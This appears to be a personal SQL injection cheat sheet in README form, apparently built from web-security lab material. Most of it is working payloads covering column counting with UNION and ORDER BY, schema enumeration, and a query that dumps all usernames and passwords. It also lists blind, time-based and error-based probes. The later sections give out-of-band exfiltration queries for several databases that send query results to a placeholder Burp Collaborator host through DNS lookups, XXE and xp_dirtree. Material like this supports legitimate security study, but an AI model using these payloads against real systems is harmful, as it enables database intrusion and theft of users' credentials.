# sqlcheatsheet
cheatsheet
# 1. In band or classic sql injection
1. Error based 2. Union based
**Error based**
testing
Error based sqlinjection
test ' "
output(success)
look for syntax errors

2. **Union based**
Counting number of columns 2methods 
1. **orderby** (increase the number 1,2,3 so on no error means the number of columns exists if error columns count end ex: ( order by 1--)   --> no error 1columns present, ( order by 2 ) --> no errors 2 columns present, ( order by 3 ) --> error 3 no column present--> so the total columns is 2)
  ' ORDER BY 1--
  ' ORDER BY 2--
  ' ORDER BY 3--
3. **null based** (go on increasing null values comma separated, at total number of columns no error until you will get errors ex: (' UNION SELECT NULL--) -->error, (' UNION SELECT NULL,NULL--) -->no error--> it means the total number of columns are 2, (' UNION SELECT NULL,NULL,NULL--)-->error)
  ' UNION SELECT NULL--
  ' UNION SELECT NULL,NULL--
  ' UNION SELECT NULL,NULL,NULL--
NOTE:
The reason for using NULL as the values returned from the injected SELECT query is that the data types in each column must be compatible between the original and the injected queries. Since NULL is convertible to every commonly used data type, using NULL maximizes the chance that the payload will succeed when the column count is correct.
On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:

' UNION SELECT NULL FROM DUAL--
The payloads described use the double-dash comment sequence -- to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character # can be used to identify a comment.


# getting database version using null 
'+UNION+SELECT+@@version,+NULL# (total number of columns is 2 --> inoder to do this first find the no.of columns using previous method it works only mysql,mssql)
for oracle

# finding text containing columns
Use Burp Suite to intercept and modify the request that sets the product category filter.
Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:

'+UNION+SELECT+NULL,NULL,NULL--
Try replacing each null with the random value provided by the lab, for example:

'+UNION+SELECT+'abcdef',NULL,NULL--
If an error occurs, move on to the next null and try that instead.

# determining number of tables found on the database and their names
Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:

'+UNION+SELECT+'abc','def'--
Use the following payload to retrieve the list of tables in the database:

'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
Find the name of the table containing user credentials.
Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--

Find the names of the columns containing usernames and passwords.
Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:

'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
print values of username and password


# 2. Blind or inferential sql injection

1.Boolean based
true or false condition based
'or 1=1#
2.delay based or time based
select sleep(5)


# cheat sheet commands 
This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.

String concatenation
You can concatenate together multiple strings to make a single string.

Oracle	'foo'||'bar'
Microsoft	'foo'+'bar'
PostgreSQL	'foo'||'bar'
MySQL	'foo' 'bar' [Note the space between the two strings]
CONCAT('foo','bar')



Substring
You can extract part of a string, from a specified offset with a specified length. Note that the offset index is 1-based. Each of the following expressions will return the string ba.

Oracle	SUBSTR('foobar', 4, 2)
Microsoft	SUBSTRING('foobar', 4, 2)
PostgreSQL	SUBSTRING('foobar', 4, 2)
MySQL	SUBSTRING('foobar', 4, 2)


Comments
You can use comments to truncate a query and remove the portion of the original query that follows your input.

Oracle	--comment
Microsoft	--comment
/*comment*/
PostgreSQL	--comment
/*comment*/
MySQL	#comment
-- comment [Note the space after the double dash]
/*comment*/


Database version
You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.

Oracle	SELECT banner FROM v$version
SELECT version FROM v$instance
Microsoft	SELECT @@version
PostgreSQL	SELECT version()
MySQL	SELECT @@version



Database contents
You can list the tables that exist in the database, and the columns that those tables contain.

Oracle	SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'
Microsoft	SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
PostgreSQL	SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
MySQL	SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'
Conditional errors
You can test a single boolean condition and trigger a database error if the condition is true.

Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
Microsoft	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END
PostgreSQL	1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)
MySQL	SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')
Extracting data via visible error messages
You can potentially elicit error messages that leak sensitive data returned by your malicious query.

Microsoft	SELECT 'foo' WHERE 1 = (SELECT 'secret')

> Conversion failed when converting the varchar value 'secret' to data type int.
PostgreSQL	SELECT CAST((SELECT password FROM users LIMIT 1) AS int)

> invalid input syntax for integer: "secret"
MySQL	SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))

> XPATH syntax error: '\secret'
Batched (or stacked) queries
You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

Oracle	Does not support batched queries.
Microsoft	QUERY-1-HERE; QUERY-2-HERE
PostgreSQL	QUERY-1-HERE; QUERY-2-HERE
MySQL	QUERY-1-HERE; QUERY-2-HERE
Note
With MySQL, batched queries typically cannot be used for SQL injection. However, this is occasionally possible if the target application uses certain PHP or Python APIs to communicate with a MySQL database.



Time delays
You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.

Oracle	dbms_pipe.receive_message(('a'),10)
Microsoft	WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT pg_sleep(10)
MySQL	SELECT SLEEP(10)


Conditional time delays
You can test a single boolean condition and trigger a time delay if the condition is true.

Oracle	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
MySQL	SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')



DNS lookup
You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.

Oracle	
(XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:

SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
The following technique works on fully patched Oracle installations, but requires elevated privileges:

SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
Microsoft	exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
PostgreSQL	copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
MySQL	
The following techniques work on Windows only:

LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
DNS lookup with data exfiltration
You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.

Oracle	SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
Microsoft	declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
PostgreSQL	create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
MySQL	The following technique works on Windows only:
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

